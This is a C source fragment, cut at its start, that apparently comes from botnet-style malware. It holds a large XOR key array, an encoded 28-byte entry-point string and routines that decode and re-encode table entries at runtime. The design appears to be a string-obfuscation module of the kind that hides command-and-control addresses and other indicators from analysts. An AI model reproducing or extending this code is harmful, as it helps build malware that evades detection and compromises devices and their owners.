0x4ef2e572, 0x309857ca, 0x5c7402c3, 0x51bb8ac8, 0x5f3b75a, 0x1eae364c, 0x1e42f701, 0x2792c9e9, 0x58c74ca0, 0x7191b61e, 0x15260a56, 0x369f9c81, 0x7e699ea3, 0x2d05aa9d, 0x6cba2a22, 0x552f02ec, 0x1b92661e, 0x783cfbbc, 0x45daf218, 0x4805e15b, 0x307c9140, 0x77b35aca, 0x4a6b521e, 0x2d8e641f, 0x34a5537e, 0x1ed76759, 0x78ba761e, 0x3ade76e6, 0x253225a8, 0xdf4e2a8, 0x62f123c7, 0x74250b1b, 0x3e8d3a72, 0x3f65268a, 0x45e095e3, 0x4480f1cc, 0x5e135cd6, 0x64238ce4, 0x6c13bbb5, 0x36daa976, 0x55b54303, 0x139c60c, 0x6d7a45f8, 0x541ee1a6, 0x2e3f70a9, 0x5a34701a, 0x294de492, 0x49d1d6c8, 0x52716bd6, 0x6f28d6aa, 0x11d7b823, 0x2edfd17, 0x66dc3174, 0x5c430a42, 0x307c6136, 0x1b8184f2, 0x7b1a719b, 0x2936d755, 0x565ffbd9, 0x204c9744, 0x372bb9fd, 0x39511fa0, 0x1471a25f, 0x75b8f46f, 0x78b6462b, 0x5a523842, 0x3a39e63c, 0x56c9a301, 0x3e75c527, 0x264da1f1, 0xda44c78, 0x142b082a, 0x278767fd, 0x7b1e9270, 0x6849e9d0, 0x55c6d8a7, 0x5553028a, 0x1197ce63, 0x1f98af6f, 0x27c46e61, 0xc0a50d, 0x31706792, 0x2ab26b78, 0x679cd682, 0xdb371d4, 0x5b2eccae, 0x31e5b74, 0x8cde370, 0x465a403, 0x597e574d, 0x291a7ab4, 0x3b915e00, 0x12cf76ee, 0x3d8c1d13, 0x314a5270, 0xb85bd19, 0x17de5555, 0x6b8438ac, 0x624f601a, 0x56541a7c, 0x11d1da9d, 0x6ff3ac92, 0x6a7f22a6, 0x3959429b, 0x6b123f02, 0x52c90c77, 0xf201b42, 0x4065418d, 0x6460dada, 0x2eb8cab1, 0x6829afee, 0x65217fe7, 0x60293243, 0x12dc1b66, 0x4cbe5669, 0x6ddca418, 0x6e0ae814, 0x4fdcb1de, 0x76aa8788, 0x72708c18, 0x295b092b, 0x1fc5023c, 0x2e01ea18, 0x3c2a8019, 0x5d511f4f, 0x5f4c3c88, 0x47b03d32, 0x752f74a4, 0x4ad07534, 0x29ff9d4d, 0x4b838f21, 0x5ca24fd2, 0x19f349df, 0x3602b1c7, 0x15fb926d, 0x50588e2, 0x8cbbe3e, 0x251badaf, 0x456aca6f, 0x6d2c9918, 0x53d47860, 0x2d947a5d, 0x524e1900, 0x33fdaaa3, 0x407095c3, 0x1f0c6f69, 0x21da4ebb, 0x2e7b7dd7, 0x6ee92147, 0x1884d643, 0x20ec09ef, 0x18442a73, 0x3849d87f, 0x4eedf408, 0x546eaa8c, 0x159af7ce, 0x2e3a3090, 0x1c1ee7bf, 0xaca6c73, 0x790aa5c5, 0x461e850c, 0x564dfb94, 0x55acf597, 0x6011ceeb, 0xc50ad5b, 0x6ba88804, 0x651757cd, 0x151c6b9a, 0x10c435b3, 0x2a82223c, 0x24904b2, 0x6498ae13, 0x58169c99, 0x54971db2, 0x189658b6, 0x1887325c, 0x73a38d1c, 0x3a70a772, 0x4702b034, 0x628cae63, 0x52f57db5, 0x67eeba23, 0x7ad0d8d6, 0xb3f5635, 0x36dcae2b, 0x4f3f8363, 0x20da4e03, 0x6516debc, 0x6b5e6b22, 0x2ba4ba76, 0x5e218481, 0x317cf02e, 0x1f2b60a, 0x33ce7a18, 0x118ebf19, 0xe436366, 0x1f77021c, 0x76a616e7, 0x235fcf00, 0x303b37cf, 0x21283923, 0x25a8d3b2, 0x14d3e5e2, 0x793ed5bd, 0x7a3ff165, 0x2d6a3e98, 0x11c60819, 0x6de37e81, 0x67dae60a, 0x58c8b84d, 0x50702ce4, 0x3ad063c0, 0x40b77271, 0x4b4105bb, 0x460fb9f5, 0x7794209c, 0x1a80891e, 0x66ea07f8, 0x5caaff58, 0x5def440, 0x128ec26f, 0x3acc83d9, 0x375be46e, 0x14817879, 0x6e9afdf1, 0x48eaa387, 0x22c4dbdf, 0xe12000d, 0x3f90ba6e, 0x4624aadf, 0x3e4d37dc, 0x60b8f392, 0x6bcd7e92, 0x53211dbe, 0x59f7c94f, 0x660d6ff7, 0x8b5c57, 0x6bbdd168, 0x53f0ee78, 0x68664261, 0x448689b6, 0x24611b5c, 0x2336a621, 0x53dfc27, 0x6fa22117, 0x69466016, 0x7cd21cc3, 0xa22aa35, 0x5030680f, 0x597d1c1c, 0x10019e75, 0x62bf2a7e, 0x14499ff5, 0x475d82e3, 0x7740a2f7, 0x2e49de7, 0x1048266b, 0x1a057ed7, 0x10f69df4, 0x4fd8e0d9, 0x602a29b6, 0x4f43d5d1, 0x3091d46b, 0x4bf7a848, 0x2264f38f, 0xa899dba, 0x3205183f, 0x22f04fe6, 0x76476f23, 0x5f606b7, 0xb569248, 0x3acdf8d9, 0x2a572214, 0x2e8d3869, 0x400bf500, 0x19f9432b, 0x17d39880, 0x3cde11c3, 0x241bed61, 0x6804008f, 0x165b2ddf, 0x341d8bd6, 0x4ac32b0d, 0x2aa4cdd5, 0x7b7b0eba, 0x4203ce04, 0x2d896bbc, 0xbc33525, 0x5c094cdb, 0x3e8009b0, 0x5b9c15fe, 0x3c337692, 0xdc3df81, 0xc2dea6a, 0x82b1eda, 0x3028d311, 0x16b78824, 0x3a30371a, 0x531922f7, 0xcfef747, 0x40263dd1, 0x5e6fb53f, 0x47ccf020, 0x6a7d5fe5, 0xcfceda9, 0x7d8e520, 0x476a311, 0x24d08629, 0x44b6f6e4, 0x28929072, 0xcd486b8, 0x5b1224c3, 0x5cb01c48, 0x5797b1c5, 0x5b6f298, 0x582b2b02, 0x199b7fc9, 0x33405e54, 0x63ee6027, 0x75a4cca5, 0x71c06805, 0x3f8a7626, 0x31d84337, 0x7f844786, 0x4bb86090, 0x3a036211, 0x2fad1a97, 0x626fe8b4, 0x7433992b, 0x2c63d8f, 0x6f6edffc, 0x3459d6fd, 0x6135f2ce, 0x373bd01c, 0x1ed736e2, 0x6e32e077, 0x3f14b53d, 0x234dd9f3, 0x130366a0, 0x3cbac21, 0x4be06a65, 0x1fd7ed58, 0x5eddd0e4, 0x289086ae, 0x776f9f1d, 0x6494c37d, 0xbbb1b0, 0x110b1ee7, 0x17d521d1, 0x64aa11d8, 0x6afeb8c, 0x99589d6, 0x243487fe, 0x38882ec3, 0x919d15d, 0x6fece88e, 0x728b90d4, 0x38c6ebf4, 0x525cd142, 0x66bf2a00, 0x3b8d2983, 0x41cbb13e, 0x1b1900fd, 0x1cc31c52, 0x7907815b, 0x39f037df, 0xaf5fcc9, 0x381c3698, 0x5d3e11d3, 0x1df9636a, 0x3be7e2b9, 0x291e7c38, 0x3dd150c2, 0x1ac5b39d, 0x51af02e6, 0x3540efe0, 0x7f5a771a, 0x526ab497, 0x464c0ec7, 0x172f98ec, 0x3714c66f, 0x4cfbfa53, 0x20c522c2, 0x5b494e6d, 0x5842916, 0x29def41f, 0x4b3636fb, 0x780fb9ea, 0x62a5e014, 0x1d93083d, 0x5ecee3ea, 0x1e330997, 0x5f5eb97c, 0x79e7e4e7, 0x3af625e9, 0x58663ad7, 0x33d81cc7, 0x45ec22b3, 0x1082716f, 0x11162e9a, 0x63e5861d, 0x4c6a5428, 0x3a34aad2, 0x21b6d6df, 0x673007c5, 0xbe3adb9, 0x56f7c6bf, 0x668a7ee0, 0x5e4e6250, 0x1d43d586, 0x7dba17cc, 0x156328bf, 0x6a3fcfd9, 0x1e7f3a8e, 0x70ac772c, 0x6fc3f8ef, 0x485e2eae, 0x3be2ae27, 0x67d3b2da, 0x2b040ec2, 0x5975b664, 0x46a296c4, 0x49371859, 0x38d46fe0, 0x408a7bac, 0x42d3e43, 0x113aaab7, 0x74629873, 0x4a1960f6, 0x21bd1c26, 0x578c70d, 0x2dfee713, 0x6e27704e, 0x3fad71df, 0x4fb5bdf2, 0x55577814, 0x4b911f98, 0x26ad84b2, 0x3be1f6f4, 0x29df81e8, 0x43f15a38, 0x399c0ec0, 0x3f42aaa7, 0x2e312a12, 0x581b494e, 0x2fef21d3, 0x1df52301, 0x207977fc, 0x6bd1cffa, 0x5c8d5db, 0x4b7d86be, 0x4547865f, 0x4c6b6ca0, 0x14b49f18, 0x7e1bf63f, 0xcf5e84c, 0x18e1dd5b
};

struct __TABLE_VALUES _TABLE[17];

void __TABLE_INIT(void) 
{
    __ADD_ENTRY_POINT(0, "\x90\x9d\x86\x9c\x97\x86\xdc\x96\x9d\x9a\xdf\x96\x97\x86\x97\x91\x86\x9b\x9d\x9c\xdf\x96\x97\x9f\x9d\xdc\x80\x87", 28);
}

void __TABLE_UNLOCK_VALUE(uint8_t _ID) 
{
    struct __TABLE_VALUES *_GET_VALUE = &_TABLE[_ID];
    __OBFUSCATION(_ID);
}

void __TABLE_LOCK_VALUE(uint8_t _ID) 
{
    struct __TABLE_VALUES *_GET_VALUE = &_TABLE[_ID];
    __OBFUSCATION(_ID);
}

char *__TABLE_RETRIEVED_VALUE(int _ID, int *_LENGHT) 
{
    struct __TABLE_VALUES *_GET_VALUE = &_TABLE[_ID];

    if (_LENGHT != NULL)
    {
        *_LENGHT = (int)_GET_VALUE->_VALUE_LENGHT;
    }

    return _GET_VALUE->_GET_VALUE;
}

static void __ADD_ENTRY_POINT(uint8_t _ID, char *_BUFFER, int _BUFFER_LENGHT) 
{
    char *GET_STATE = malloc(_BUFFER_LENGHT);

    __MEMCPY(GET_STATE, _BUFFER, _BUFFER_LENGHT);

    _TABLE[_ID]._GET_VALUE = GET_STATE;
    _TABLE[_ID]._VALUE_LENGHT = (uint16_t)_BUFFER_LENGHT;
}

static void __OBFUSCATION(uint8_t _ID) 
{
    struct __TABLE_VALUES *_GET_VALUE = &_TABLE[_ID];

    for (int GET_COUNTER = 0; GET_COUNTER < (sizeof(__TABLE_XOR_KEYS) / sizeof(*__TABLE_XOR_KEYS)); GET_COUNTER++) 
    {
        uint32_t SINGLE_XOR_KEY = __TABLE_XOR_KEYS[GET_COUNTER];

        uint8_t FIRST_VALUE = SINGLE_XOR_KEY & 0xff, SECOND_VALUE = (SINGLE_XOR_KEY >> 8) & 0xff, THIRD_VALUE = (SINGLE_XOR_KEY >> 16) & 0xff, FOURTH_VALUE = (SINGLE_XOR_KEY >> 24) & 0xff;

        for (int GET_COUNTER = 0; GET_COUNTER < _GET_VALUE->_VALUE_LENGHT; GET_COUNTER++) 
        {
            _GET_VALUE->_GET_VALUE[GET_COUNTER] ^= FIRST_VALUE;
            _GET_VALUE->_GET_VALUE[GET_COUNTER] ^= SECOND_VALUE;
            _GET_VALUE->_GET_VALUE[GET_COUNTER] ^= THIRD_VALUE;
            _GET_VALUE->_GET_VALUE[GET_COUNTER] ^= FOURTH_VALUE;
        }
    }
}
